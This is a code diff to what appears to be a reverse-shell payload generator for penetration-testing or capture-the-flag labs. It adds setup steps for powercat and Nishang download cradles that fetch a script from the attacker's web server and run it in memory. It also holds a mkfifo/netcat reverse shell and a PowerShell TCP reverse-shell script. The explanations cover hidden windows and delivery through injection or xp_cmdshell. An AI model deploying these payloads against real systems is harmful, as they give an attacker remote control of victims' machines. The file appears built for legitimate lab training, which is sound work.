@@ -12,6 +12,11 @@ const FIFO_PARTS = [
 ];
 const FIFO = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f";
 const BASH_C_PART = { token: "bash -c", explain: "-c: run the quoted string. Added outside a real bash prompt (injection, URL, system()) so dash does not choke on the payload." };
+const SERVE = "python3 -m http.server {SERVE_PORT}";
+const SERVE_PART = {
+  token: "python3 -m http.server",
+  explain: "On Kali, from the folder with the file: serves it on port 80, or on 8000 when your listener takes 80 (the cradle URL then says :8000). Leave it running until the shell connects.",
+};
 const ALL_LINUX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"] as const;
 const POWERSHELL_SCRIPT =
   '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};' +
@@ -93,22 +98,30 @@ export const REVERSE_SHELLS: PayloadDef[] = [
   {
     id: "powercat-cradle", generator: "shell", title: "powercat cradle (in memory)", os: "windows",
     contexts: ["powershell"], requires: ["powershell", "served-file"],
-    template: "IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e powershell",
+    template: "IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e powershell",
     parts: [
+      { token: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", explain: "On Kali: copies powercat.ps1 (from Kali's powercat package) into the folder you serve." },
+      SERVE_PART,
       { token: "IEX(", explain: "Runs the downloaded text as code, so nothing is written to disk." },
       { token: "DownloadString('http://", explain: "Fetches powercat.ps1 from your web server." },
       { token: "powercat -c", explain: "-c: connect out to the listener." },
       { token: "-p", explain: "-p: the listener's port." },
       { token: "-e powershell", explain: "-e: program to attach to the socket. Use cmd for a cmd shell." },
     ],
-    listener: "penelope", serve: "python3 -m http.server 80",
+    listener: "penelope", prepare: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", serve: SERVE,
     notes: ["Run from a PowerShell prompt. To use it from cmd, a macro or a SQL string, base64 it for -e first."],
   },
   {
     id: "nishang-cradle", generator: "shell", title: "Nishang cradle (served rev.ps1)", os: "windows",
     contexts: ["cmd", "powershell", "sql-string"], requires: ["powershell", "served-file"],
-    template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/rev.ps1')"`,
+    template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/rev.ps1')"`,
     parts: [
+      { token: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1", explain: "On Kali: copies Nishang's reverse-shell script to rev.ps1 in the folder you serve." },
+      {
+        token: "echo 'Invoke-PowerShellTcp -Reverse -IPAddress … -Port …' >> rev.ps1",
+        explain: "Appends the call, with your LHOST and LPORT, to the end of rev.ps1. Without it IEX only defines the function and nothing connects back.",
+      },
+      SERVE_PART,
       { token: "powershell", explain: "Starts PowerShell." },
       { token: "-nop", explain: "-nop: no profile." },
       { token: "-w hidden", explain: "-w hidden: no visible window." },
@@ -116,7 +129,8 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "IEX(", explain: "Runs the downloaded rev.ps1 in memory." },
       { token: "rev.ps1", explain: "Your served reverse-shell script. It has LHOST and LPORT inside, so regenerate it after a VPN IP change." },
     ],
-    listener: "penelope", bakesIp: true, serve: "python3 -m http.server 80",
+    listener: "penelope", bakesIp: true, serve: SERVE,
+    prepare: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}' >> rev.ps1",
     notes: ["Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'."],
   },
   {
